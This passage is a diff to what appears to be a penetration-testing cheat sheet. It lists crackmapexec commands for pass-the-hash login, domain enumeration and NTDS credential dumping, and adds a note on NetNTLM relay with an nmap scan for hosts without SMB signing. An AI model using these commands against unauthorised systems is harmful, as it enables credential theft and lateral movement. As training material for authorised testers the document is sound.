@@ -118,3 +118,11 @@ crackmapexec <CIDR> -u <user> -p <password> --local-auth
 crackmapexec <CIDR> -u <user> -H <LM:NT>
 crackmapexec <CIDR> -u <user> -p <password> -d <domain> --users | --groups | --pass-pol
 crackmapexec <CIDR> -u <user> -p <password> -d <domain> --ntds
+
+NetNTLM Relay
+Although NetNTLM hashes cannot be used to pass-the-hash, they can perform 'relay'.
+By relay operation, attackers can authenticate other systems on network.
+Targeted user must be local admin on targeted system.
+In order to perform relay operation, SMB Signing must be disabled. (By default, it is disabled on Windows systems.)
+  nmap -sV -p445 --script=smb-security-mode <CIDR>
+  
